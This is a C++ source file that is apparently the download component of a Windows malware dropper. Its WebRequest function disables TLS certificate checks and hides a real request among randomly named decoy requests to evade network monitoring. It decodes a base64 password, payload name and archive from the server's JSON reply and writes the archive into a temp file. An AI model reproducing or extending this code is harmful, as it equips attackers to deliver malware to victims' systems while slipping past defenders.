#include "settings.h"

#ifdef _DROPPER

#define CPPHTTPLIB_OPENSSL_SUPPORT

#include "httplib.h"
#include "util.h"
#include "base64/base64.h"


#include "json.hpp"
using json = nlohmann::json;


std::string generate_random_path(size_t& path_len) {
    const std::string chars = "abcdefghijklmnopqrstuvwxyz0123456789_";
    std::string path = "/";
    for (int i = 0; i < path_len; ++i) {
        path += chars[rand() % chars.length()];
    }
    return path;
}


void make_random_request(httplib::SSLClient& cli, size_t& path_len) {
    std::string random_path = generate_random_path(path_len);
    auto res = cli.Get(random_path.c_str());
}


bool WebRequest(
    const std::string& host,
    const int& port,
    std::string& path,
    std::string& zipFilePath,
    std::string& password,
    std::string& payloadFileName
)
{
    srand(time(0));
    // Get temporary folder
    char tempPath[MAX_PATH] = { 0 };
    DWORD result = GetTempPathA(MAX_PATH, tempPath);
    if (result > MAX_PATH || result == 0) {
        return false;
    }

    std::string tempDir = std::string(tempPath);
    if (tempDir.empty()) {
        DEBUG_ERR("Failed to get temporary folder");
        return false;
    }

    char tempName[MAX_PATH] = { 0 };
    GetTempFileNameA(tempPath, "TH", 0, tempName);
    zipFilePath = std::string(tempName);
    if (tempDir.empty()) {
        DEBUG_ERR("Failed to get temporary file");
        return false;
    }

    httplib::SSLClient client(host.c_str(), port);
    client.enable_server_certificate_verification(false);

    size_t path_len = path.length();

    for (int i = 0; i < REQUESTS_BEFORE; ++i) {
        make_random_request(client, path_len);
    }

    auto res = client.Get(path.c_str());

    for (int i = 0; i < REQUESTS_AFTER; ++i) {
        make_random_request(client, path_len);
    }

    if (res && res->status == 200) {
        DEBUG_MSG("Success request" << std::endl);
        auto json = nlohmann::json::parse(res->body);
        std::string password_encoded = json[REAL_PASSWORD_NAME];
        password = base64_decode(password_encoded);

        std::string names_encoded = json["name"];
        payloadFileName = base64_decode(names_encoded);

        std::string file_encoded = json["file"];
        std::string file_data = base64_decode(file_encoded);
        std::ofstream file(zipFilePath, std::ios::binary);
        file.write((file_data.data()), file_data.size());

        file.close();
    }
    else {
        DEBUG_ERR("Request: " << res.error() << std::endl);
        return false;
    }
    
    return true;
}

#endif